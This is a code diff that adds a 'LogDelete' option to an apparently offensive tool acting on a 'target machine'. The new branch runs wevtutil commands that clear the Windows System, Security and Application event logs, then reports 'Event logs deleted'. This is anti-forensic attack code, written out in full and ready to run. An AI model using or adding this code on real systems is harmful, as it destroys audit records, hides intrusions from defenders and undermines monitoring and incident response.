@@ -1013,6 +1013,27 @@ while True:
 #
 #
 #
+
+
+    if action =="LogDelete" or action == "logdelete":
+        logging.info(f"Chosen action LogDelete to delete event logs on target machine")
+        delete_logs="wevtutil cl System & wevtutil cl Security & wevtutil cl Application"
+        run_ps(delete_logs)
+        print("Event logs deleted")
+        sleep(2)
+        input("Press Enter to continue...")
+
+
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
   
 
 #Action exit = exiting the program
